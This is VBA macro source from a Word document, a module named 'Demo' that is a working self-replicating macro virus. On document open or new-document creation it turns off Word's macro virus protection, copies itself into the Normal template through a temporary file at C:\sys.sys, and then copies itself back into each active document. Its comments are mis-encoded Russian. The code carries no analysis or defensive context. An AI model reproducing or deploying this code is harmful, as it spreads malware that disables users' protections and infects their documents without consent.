   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Demo"
   Sub AutoOpen()
       On Error Resume Next ' Îòêëþ÷åíèå âñåõ îøèáîê
       Options.VirusProtection = False ' îòêëþ÷åíèå âñòðîåííîé ìàêðîçàùèòû
       For i = 1 To NormalTemplate.VBProject.VBComponents.Count
           If NormalTemplate.VBProject.VBComponents(i).Name = "Demo" Then Infected = True
       Next i
       If Infected <> True Then
           ActiveDocument.VBProject.VBComponents("Demo").Export "C:\sys.sys"
           NormalTemplate.VBProject.VBComponents.Import "C:\sys.sys"
           Kill "C:\sys.sys"
       End If
       Infected = False
       For i = 1 To ActiveDocument.VBProject.VBComponents.Count
           If ActiveDocument.VBProject.VBComponents(i).Name = "Demo" Then Infected = True
       Next i
       If Infected <> True Then
           NormalTemplate.VBProject.VBComponents("Demo").Export "C:\sys.sys"
           ActiveDocument.VBProject.VBComponents.Import "C:\sys.sys"
           Kill "C:\sys.sys"
       End If
   End Sub
   Sub AutoNew()
       AutoOpen
   End Sub
